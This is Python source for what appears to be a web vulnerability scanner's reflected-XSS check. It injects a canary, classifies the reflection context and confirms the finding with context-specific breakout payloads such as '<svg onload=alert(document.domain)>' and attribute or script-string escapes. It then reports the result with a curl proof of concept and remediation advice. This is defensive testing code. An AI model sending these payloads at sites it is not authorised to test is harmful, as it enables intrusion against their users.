"""Reflected XSS check (context-aware, validation-first).

Strategy:
  1. Inject a self-delimiting canary:  LEFT <>"' RIGHT  — two unique tokens
     bracketing the four HTML-significant characters. Whatever the server does
     to `<>"'` ends up *between* the two tokens, so we can read it back exactly
     and know which characters survived unencoded (`&lt;` etc. do not contain
     the raw character).
  2. Work out the reflection context — HTML text, an attribute value (and its
     quote), or inside a <script> JS string (and its quote).
  3. Choose a breakout payload that the *surviving* characters actually permit.
     A raw `"` inside a double-quoted attribute is injectable even when `<` and
     `>` are encoded; a raw `'` inside a single-quoted JS string likewise.
  4. CONFIRM: re-request with that real payload and require it to come back
     verbatim. Only then is the finding "validated" — the recorded exchange is
     the proof. Otherwise we report "probable" with no PoC claimed.

The payloads are inert as sent (they are only *reflected*, never executed in
this process); the PoC shows the request that lands executable markup.
"""
from __future__ import annotations

import secrets

from ..crawler import Surface
from .base import Check, Finding

# CVSS 3.1: network, low complexity, no privs, user interaction required,
# scope changed (runs in victim's browser), low C/I impact.
_VECTOR = "AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N"

# If the two markers end up this far apart, something sizeable landed between
# them (not a simple reflection); treat raw-char presence as untrustworthy.
_MAX_MID = 40


class ReflectedXssCheck(Check):
    id = "reflected-xss"
    name = "Reflected Cross-Site Scripting"
    cwe = "CWE-79"

    def run(self, surface: Surface) -> list[Finding]:
        findings: list[Finding] = []
        for param in surface.params:
            finding = self._test_param(surface, param)
            if finding:
                findings.append(finding)
        return findings

    def _test_param(self, surface: Surface, param: str) -> Finding | None:
        left = "l" + secrets.token_hex(4)
        right = "r" + secrets.token_hex(4)
        canary = f"{left}<>\"'{right}"
        resp = self.client.request(**surface.mutate(param, canary))
        if resp.error or "html" not in (resp.header("content-type") or "").lower():
            return None

        body = resp.body
        li = body.find(left)
        if li == -1:
            return None  # not reflected at all

        mid_start = li + len(left)
        ri = body.find(right, mid_start)
        reliable = ri != -1 and (ri - mid_start) <= _MAX_MID
        mid = body[mid_start:ri] if reliable else body[mid_start:mid_start + _MAX_MID]
        survived = {c for c in '<>"\'' if c in mid}

        plan = None
        if reliable:
            kind, quote = _context(body, li)
            plan = _plan_payload(kind, quote, survived)
        else:
            kind, quote = _context(body, li)

        if plan is not None:
            payload, needed, ctx_desc = plan
            # Confirm the real payload survives verbatim — that is the proof.
            confirm = self.client.request(**surface.mutate(param, payload))
            confirm_exchange = self.client.log[-1]
            if not confirm.error and payload in confirm.body:
                return Finding(
                    check_id=self.id, name=self.name,
                    url=surface.url.split("?")[0], parameter=param,
                    cvss_vector=_VECTOR, cwe=self.cwe, confidence="validated",
                    description=(
                        f"The '{param}' parameter is reflected into the response "
                        f"in {ctx_desc} without adequate output encoding, allowing "
                        f"HTML/JavaScript injection that executes in the victim's "
                        f"browser (reflected XSS)."
                    ),
                    evidence=(
                        f"Probe '{canary}' reflected as '...{left}{mid}{right}...' "
                        f"({ctx_desc}); {needed} survived unencoded. The breakout "
                        f"payload below was then sent and reflected verbatim, "
                        f"confirming injection."
                    ),
                    poc=(
                        f"{surface.shown(param, payload)}\n\n"
                        f"The reflected payload introduces executable markup in "
                        f"the page's origin. Reproduce with:\n"
                        f"{surface.curl(param, payload)}"
                    ),
                    remediation=(
                        "Contextually output-encode the parameter for the context "
                        "it is written into (HTML-entity encode <, >, \", ', & for "
                        "HTML/attribute contexts; never reflect untrusted input "
                        "into inline <script>). Prefer the framework's "
                        "auto-escaping templating. Add a restrictive "
                        "Content-Security-Policy as defence in depth."
                    ),
                    exchanges=[confirm_exchange],
                )

        # Reflected, but we could not prove a breakout -> probable, no PoC.
        return Finding(
            check_id=self.id, name=self.name,
            url=surface.url.split("?")[0], parameter=param,
            cvss_vector=_VECTOR, cwe=self.cwe, confidence="probable",
            description=(
                f"The '{param}' parameter is reflected in the response "
                f"({_context(body, li)[0]} context) but a breakout could not be "
                f"proven — the characters needed to escape this context appear "
                f"encoded or the reflection is not cleanly delimited. May still "
                f"be exploitable; needs manual review."
            ),
            evidence=(
                f"Token reflected; surviving special chars near it: "
                f"{sorted(survived) or 'none'}."
            ),
            poc="(not validated — manual review required)",
            remediation="Verify contextual output encoding across all contexts.",
            exchanges=[self.client.log[-1]],
        )


def _context(body: str, li: int) -> tuple[str, str | None]:
    """Classify the reflection point at index `li`.

    Returns (kind, quote) where kind is 'script', 'attr' or 'text', and quote is
    the enclosing quote character for attr/script-string contexts (or None).
    """
    lower = body.lower()
    open_s = lower.rfind("<script", 0, li)
    close_s = lower.rfind("</script", 0, li)
    if open_s != -1 and open_s > close_s:
        # Inside a <script> element; find the enclosing JS string quote, if any.
        tag_end = body.find(">", open_s)
        start = tag_end + 1 if tag_end != -1 else open_s
        return "script", _enclosing_quote(body, start, li)

    last_lt = body.rfind("<", 0, li)
    last_gt = body.rfind(">", 0, li)
    if last_lt > last_gt:
        # Inside a tag's attribute list.
        return "attr", _enclosing_quote(body, last_lt, li)

    return "text", None


def _enclosing_quote(body: str, start: int, li: int) -> str | None:
    """The quote character open at position `li`, scanning from `start`."""
    q: str | None = None
    for ch in body[start:li]:
        if ch in ('"', "'"):
            if q is None:
                q = ch
            elif q == ch:
                q = None
    return q


def _plan_payload(kind: str, quote: str | None, survived: set) -> tuple | None:
    """Pick a breakout payload the surviving characters allow, or None.

    Returns (payload, needed_description, context_description).
    """
    dq, sq = '"' in survived, "'" in survived
    tag = '<' in survived and '>' in survived
    alert = "alert(document.domain)"

    if kind == "text":
        if tag:
            return (f"<svg onload={alert}>", "`<` and `>`", "HTML text")
        return None

    if kind == "attr":
        if quote == '"' and dq:
            if tag:
                return (f'"><svg onload={alert}>', "`\"`, `<` and `>`",
                        "a double-quoted attribute value")
            return (f'" onfocus={alert} autofocus="', "the double-quote `\"`",
                    "a double-quoted attribute value")
        if quote == "'" and sq:
            if tag:
                return (f"'><svg onload={alert}>", "`'`, `<` and `>`",
                        "a single-quoted attribute value")
            return (f"' onfocus={alert} autofocus='", "the single-quote `'`",
                    "a single-quoted attribute value")
        if quote is None and tag:
            return (f"><svg onload={alert}>", "`<` and `>`",
                    "an unquoted attribute value")
        return None

    if kind == "script":
        if tag:
            return (f"</script><svg onload={alert}>", "`</script>` breakout",
                    "an inline <script> (broke out of the script element)")
        if quote == "'" and sq:
            return (f"'-{alert}-'", "the single-quote `'`",
                    "a single-quoted string inside <script>")
        if quote == '"' and dq:
            return (f'"-{alert}-"', "the double-quote `\"`",
                    "a double-quoted string inside <script>")
        return None

    return None
